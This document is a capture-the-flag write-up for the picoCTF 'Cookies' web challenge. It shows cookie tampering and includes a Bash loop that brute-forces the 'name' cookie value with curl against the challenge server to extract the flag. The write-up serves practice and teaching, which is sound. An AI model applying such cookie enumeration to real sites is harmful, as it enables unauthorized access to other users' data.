# :pencil: Description

Who doesn't love cookies? Try to figure out the best one. [link](https://play.picoctf.org/practice/challenge/173)

# :unlock: Solution

1. Access the link

    [image1](images/image1.png)

2. Entered `snickerdoodle` into the input field and clicked the `Search` button`>` A message was displayed on the page

    ![image2](images/image2.png)

3. Checked the cookie `>` We have a cookie named `name` with the value `0`

    ![image3](images/image3.png)

4. Changed the cookie value to `1` and reloaded the page `>` A new message appeared

    ![image4](images/image4.png)

5. So the flag might be revealed at a certain value, therefore we can write a Bash script to automate the process.

    ```sh
    #!/bin/bash

    for i in {0..24}
    do
        cookie="name=$i"
        response=$(curl -s -H "Cookie: $cookie" "http://mercury.picoctf.net:21485/check")

        if echo "$response" | grep -q "picoCTF"; then
            echo "$response" | grep -i "picoCTF"
        fi
    done
    ```

6. We found it
